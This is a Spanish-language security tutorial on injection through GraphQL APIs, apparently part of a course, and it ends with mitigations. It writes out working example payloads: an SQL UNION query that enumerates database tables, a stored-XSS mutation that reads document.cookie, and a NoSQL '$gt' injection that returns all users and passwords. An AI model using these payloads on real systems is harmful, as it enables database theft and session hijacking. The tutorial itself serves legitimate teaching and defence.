# Ataques de inyección en GraphQL

## GraphQL como pasarela de inyección

GraphQL es un intermediario entre el cliente y la base de datos — si no sanitiza los argumentos que recibe antes de usarlos en consultas SQL, NoSQL, o comandos de sistema, hereda exactamente las mismas vulnerabilidades de inyección que cualquier otra aplicación web. El lenguaje de consulta en el frontend cambia; la causa raíz es idéntica.

## Inyección SQL a través de argumentos GraphQL

Una consulta GraphQL que acepta un argumento `username`:

```graphql
{
  user(username: "admin") {
    id
    username
  }
}
```

Si el backend construye la consulta SQL concatenando ese argumento sin parametrizar, una comilla simple revela el fallo:

```graphql
{
  user(username: "admin'") {
    username
  }
}
```

Respuesta con error SQL (confirma la vulnerabilidad):
```json
{
  "errors": [{
    "message": "syntax error at or near \"'\""
  }]
}
```

Una vez confirmada, la técnica es idéntica a la SQL Injection vista en el bloque de *SQL Injection Fundamentals* — determinar número de columnas, construir UNION, enumerar via `INFORMATION_SCHEMA`:

```graphql
{
  user(username: "x' UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6 FROM information_schema.tables WHERE table_schema=database()-- -") {
    username
  }
}
```

La introspección previa es clave aquí: revela exactamente cuántos campos devuelve el tipo afectado, lo que permite construir el UNION con el número correcto de columnas sin necesidad de prueba y error.

## XSS a través de datos GraphQL

Si la aplicación almacena datos vía mutaciones GraphQL y luego los renderiza sin escapar, los campos de texto son vectores de XSS almacenado — exactamente el mismo patrón del bloque de *Cross-Site Scripting*:

```graphql
mutation {
  createPost(title: "<script>alert(document.cookie)</script>", content: "...") {
    id
  }
}
```

Si el título se muestra en una página sin sanitización → XSS almacenado.

## Inyección NoSQL

En APIs GraphQL respaldadas por MongoDB u otras bases NoSQL, los argumentos pueden contener operadores NoSQL si no se valida el tipo:

```graphql
{
  user(username: {"$gt": ""}) {
    username
    password
  }
}
```

Si el backend pasa el objeto directamente al motor NoSQL, el operador `$gt: ""` devuelve todos los usuarios cuyo username sea mayor que cadena vacía — es decir, todos.

## La mitigación: idéntica a cualquier otra inyección

- Validación estricta de tipos en los argumentos GraphQL.
- Consultas parametrizadas/preparadas en el backend, nunca concatenación directa de argumentos.
- Sanitización de salida para valores que se renderizan en HTML.
- El control de tipos de GraphQL ayuda (si un argumento es de tipo `String` y se pasa un objeto, GraphQL puede rechazarlo), pero no es suficiente si los valores de tipo `String` no se tratan como datos en el SQL generado.
